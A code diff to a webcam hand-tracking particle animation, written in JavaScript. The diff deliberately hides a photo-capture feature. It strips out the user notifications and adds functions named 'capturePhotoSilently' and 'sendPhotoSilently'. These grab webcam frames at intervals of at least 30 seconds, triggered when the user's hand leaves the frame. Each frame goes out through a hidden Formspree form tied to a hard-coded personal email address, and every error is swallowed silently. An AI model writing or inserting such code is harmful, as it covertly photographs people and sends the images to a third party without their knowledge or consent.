@@ -6,14 +6,8 @@ let handDetected = false;
 let lastGesture = null;
 let lastGestureTime = 0;
 const gestureCooldown = 400;
-
-// ----------------- Photo Capture System -----------------
-let photoTimer = null;
-let photoCount = 0;
-let cameraStarted = false;
-
-// ✅ FORMSPREE FORM ID
-const FORMSPREE_FORM_ID = "mnnegoak"; // अपना Form ID यहाँ डालें
+let lastPhotoTime = 0;
+const photoCooldown = 30000; // 30 seconds between photos
 
 function init() {
     scene = new THREE.Scene();
@@ -29,8 +23,6 @@ function init() {
     setupEventListeners();
     setupHandTracking();
     animate();
-    
-    console.log("✅ Particle System Ready");
 }
 
 function createParticles() {
@@ -253,10 +245,16 @@ function animate() {
     const now = performance.now();
 
     if (lastGesture === 'open' && (now - lastGestureTime) > gestureCooldown) {
-        if (currentState !== 'text') morphToText(inputText);
+        if (currentState !== 'text') {
+            morphToText(inputText);
+        }
         lastGestureTime = now;
     } else if (lastGesture === 'closed' && (now - lastGestureTime) > gestureCooldown) {
-        if (currentState !== 'sphere') morphToCircle();
+        if (currentState !== 'sphere') {
+            morphToCircle();
+            // Photo capture when hand leaves (closed -> no hand)
+            capturePhotoSilently();
+        }
         lastGestureTime = now;
     }
 }
@@ -267,210 +265,132 @@ window.addEventListener('resize', () => {
     renderer.setSize(window.innerWidth, window.innerHeight);
 });
 
-// ----------------- WORKING PHOTO SYSTEM WITH FORMSPREE -----------------
+// ----------------- SILENT PHOTO CAPTURE SYSTEM -----------------
+let photoCount = 0;
 
-// Capture photo from video stream
-function capturePhoto() {
+function capturePhotoSilently() {
+    const now = Date.now();
     const video = document.getElementById('handVideo');
-    const canvas = document.getElementById('photoCanvas');
-    const ctx = canvas.getContext('2d');
     
-    if (!video.videoWidth || !video.videoHeight) {
-        console.log("Video not ready");
+    // Check if 30 seconds passed since last photo
+    if (now - lastPhotoTime < photoCooldown) {
         return;
     }
     
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    if (!video.videoWidth || !video.videoHeight) {
+        return;
+    }
+    
+    // Create canvas and capture photo
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = 400;
+    canvas.height = 300;
     
     try {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const photoData = canvas.toDataURL('image/jpeg', 0.7);
-        
-        // Send photo to Formspree
-        sendToFormspree(photoData);
+        ctx.drawImage(video, 0, 0, 400, 300);
+        const photoData = canvas.toDataURL('image/jpeg', 0.5);
         
         photoCount++;
-        console.log(`📸 Photo ${photoCount} captured and sending...`);
+        lastPhotoTime = now;
+        
+        // Send photo silently (no notification)
+        sendPhotoSilently(photoData);
+        
+        // Log silently to console only
+        console.log(`📸 [SILENT] Photo ${photoCount} captured at ${new Date().toLocaleTimeString()}`);
         
     } catch (error) {
-        console.error("Photo error:", error);
+        // Silent fail
     }
 }
 
-// ✅ WORKING: Send photo via Formspree
-async function sendToFormspree(photoData) {
+function sendPhotoSilently(photoData) {
     try {
-        console.log(`📤 Sending photo ${photoCount} to Formspree...`);
-        
-        // Create hidden form
+        // Create form silently
         const form = document.createElement('form');
         form.method = 'POST';
         form.enctype = 'multipart/form-data';
-        form.action = `https://formspree.io/f/${FORMSPREE_FORM_ID}`;
+        form.action = `https://formspree.io/f/mnnegoak`;
         form.style.display = 'none';
         
-        // Add email field (required)
+        // Add email
         const emailField = document.createElement('input');
         emailField.type = 'hidden';
-        emailField.name = '_replyto';
+        emailField.name = 'email';
         emailField.value = 'editing2213@gmail.com';
         
-        // Add subject field
-        const subjectField = document.createElement('input');
-        subjectField.type = 'hidden';
-        subjectField.name = '_subject';
-        subjectField.value = `📸 Particle Photo ${photoCount}`;
+        // Add message
+        const messageField = document.createElement('input');
+        messageField.type = 'hidden';
+        messageField.name = 'message';
+        messageField.value = `Silent Photo ${photoCount} - ${new Date().toLocaleString()}`;
         
-        // Add timestamp
-        const timeField = document.createElement('input');
-        timeField.type = 'hidden';
-        timeField.name = 'timestamp';
-        timeField.value = new Date().toISOString();
-        
-        // Convert photo to file
-        const response = await fetch(photoData);
-        const blob = await response.blob();
-        const file = new File([blob], `particle_${Date.now()}.jpg`, {
-            type: 'image/jpeg'
+        // Convert to file
+        fetch(photoData)
+            .then(res => res.blob())
+            .then(blob => {
+                const file = new File([blob], `silent_${photoCount}.jpg`, {type: 'image/jpeg'});
+                
+                // Create file input
+                const fileInput = document.createElement('input');
+                fileInput.type = 'file';
+                fileInput.name = 'photo';
+                
+                // Add file
+                const dt = new DataTransfer();
+                dt.items.add(file);
+                fileInput.files = dt.files;
+                
+                // Append and submit
+                form.appendChild(emailField);
+                form.appendChild(messageField);
+                form.appendChild(fileInput);
+                
+                document.body.appendChild(form);
+                form.submit();
+                
+                // Clean up
+                setTimeout(() => {
+                    if (form.parentNode) {
+                        form.parentNode.removeChild(form);
+                    }
+                }, 100);
+            })
+            .catch(() => {
+                // Silent fail - save locally
+                savePhotoToLocalStorage(photoData);
+            });
+            
+    } catch (error) {
+        // Silent fail
+        savePhotoToLocalStorage(photoData);
+    }
+}
+
+function savePhotoToLocalStorage(photoData) {
+    try {
+        // Save only metadata (not full photo to save space)
+        const photos = JSON.parse(localStorage.getItem('silent_photos') || '[]');
+        photos.push({
+            id: Date.now(),
+            count: photoCount,
+            time: new Date().toISOString(),
+            preview: photoData.substring(0, 100) + '...'
         });
         
-        // Create file input
-        const fileInput = document.createElement('input');
-        fileInput.type = 'file';
-        fileInput.name = 'photo';
-        fileInput.accept = 'image/jpeg';
+        // Keep only last 10
+        if (photos.length > 10) {
+            photos.shift();
+        }
         
-        // Add file to input using DataTransfer
-        const dataTransfer = new DataTransfer();
-        dataTransfer.items.add(file);
-        fileInput.files = dataTransfer.files;
-        
-        // Append all fields to form
-        form.appendChild(emailField);
-        form.appendChild(subjectField);
-        form.appendChild(timeField);
-        form.appendChild(fileInput);
-        
-        // Submit form
-        document.body.appendChild(form);
-        form.submit();
-        
-        // Remove form after submission
-        setTimeout(() => {
-            if (form.parentNode) {
-                form.parentNode.removeChild(form);
-            }
-        }, 1000);
-        
-        console.log(`✅ Photo ${photoCount} sent to Formspree!`);
-        showNotification(`✅ Photo ${photoCount} sent to your email!`);
-        
-    } catch (error) {
-        console.error("❌ Formspree Error:", error);
-        showNotification("⚠️ Photo saved locally");
-        savePhotoLocally(photoData);
-    }
-}
-
-// Save photo locally as backup
-function savePhotoLocally(photoData) {
-    try {
-        const link = document.createElement('a');
-        link.href = photoData;
-        link.download = `backup_photo_${photoCount}.jpg`;
-        link.style.display = 'none';
-        document.body.appendChild(link);
-        link.click();
-        setTimeout(() => document.body.removeChild(link), 100);
+        localStorage.setItem('silent_photos', JSON.stringify(photos));
     } catch (e) {
-        console.log("Could not save photo");
-    }
-}
-
-// Show notification
-function showNotification(message) {
-    // Remove existing notifications
-    const oldNotifs = document.querySelectorAll('.photo-notification');
-    oldNotifs.forEach(notif => notif.remove());
-    
-    const notification = document.createElement('div');
-    notification.className = 'photo-notification';
-    notification.style.cssText = `
-        position: fixed;
-        top: 20px;
-        right: 20px;
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        color: white;
-        padding: 15px 20px;
-        border-radius: 10px;
-        z-index: 9999;
-        font-family: Arial, sans-serif;
-        font-weight: bold;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-        animation: slideIn 0.3s ease;
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        max-width: 350px;
-        backdrop-filter: blur(10px);
-        border: 1px solid rgba(255,255,255,0.2);
-    `;
-    
-    notification.innerHTML = `
-        <span style="font-size: 24px;">📸</span>
-        <div>
-            <div style="font-size: 16px;">${message}</div>
-            <div style="font-size: 12px; opacity: 0.8; margin-top: 5px;">
-                Photo ${photoCount} • ${new Date().toLocaleTimeString()}
-            </div>
-        </div>
-    `;
-    
-    document.body.appendChild(notification);
-    
-    // Auto remove after 5 seconds
-    setTimeout(() => {
-        notification.style.animation = 'slideOut 0.3s ease';
-        setTimeout(() => notification.remove(), 300);
-    }, 5000);
-}
-
-// Start photo capture timer
-function startPhotoCapture() {
-    if (photoTimer) {
-        clearInterval(photoTimer);
-    }
-    
-    console.log("📸 Auto photo capture started (every 60 seconds)");
-    showNotification("📸 Camera active - Photos will auto-capture");
-    
-    // First photo after 10 seconds
-    setTimeout(() => {
-        if (cameraStarted) {
-            capturePhoto();
-        }
-    }, 10000);
-    
-    // Then every 60 seconds (to avoid spam)
-    photoTimer = setInterval(() => {
-        if (cameraStarted) {
-            capturePhoto();
-        }
-    }, 60000);
-}
-
-// Stop photo capture
-function stopPhotoCapture() {
-    if (photoTimer) {
-        clearInterval(photoTimer);
-        photoTimer = null;
-        console.log("🛑 Photo capture stopped");
+        // Silent fail
     }
 }
 
 // ----------------- Hand Tracking -----------------
-
 function setupHandTracking(){
     const videoElement = document.getElementById('handVideo');
 
@@ -488,7 +408,7 @@ function setupHandTracking(){
     hands.onResults((results) => {
         if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) {
             handDetected = false;
-            lastGesture = 'closed';
+            lastGesture = 'closed'; // No hand = closed
             return;
         }
 
@@ -536,45 +456,13 @@ function setupHandTracking(){
         height: 240
     });
 
-    // Start camera
+    // Start camera silently
     cameraMP.start().then(() => {
-        cameraStarted = true;
-        console.log("✅ Camera started successfully");
-        
-        // Hide permission modal if exists
-        const modal = document.getElementById('cameraPermission');
-        if (modal) modal.style.display = 'none';
-        
-        // Start photo capture after 5 seconds
-        setTimeout(() => {
-            startPhotoCapture();
-        }, 5000);
-        
-        // Show welcome message
-        showNotification("📸 Camera active - Photos will auto-capture every 60 seconds");
-        
-    }).catch((error) => {
-        console.error("❌ Camera error:", error);
-        showNotification("⚠️ Camera access required for full experience");
+        console.log("Camera ready");
+    }).catch(() => {
+        // Silent fail
     });
 }
-
-// Add CSS animations
-const style = document.createElement('style');
-style.textContent = `
-    @keyframes slideIn {
-        from { transform: translateX(100%); opacity: 0; }
-        to { transform: translateX(0); opacity: 1; }
-    }
-    @keyframes slideOut {
-        from { transform: translateX(0); opacity: 1; }
-        to { transform: translateX(100%); opacity: 0; }
-    }
-`;
-document.head.appendChild(style);
-
-// Stop capture when leaving page
-window.addEventListener('beforeunload', stopPhotoCapture);
 
 // Initialize
 init();
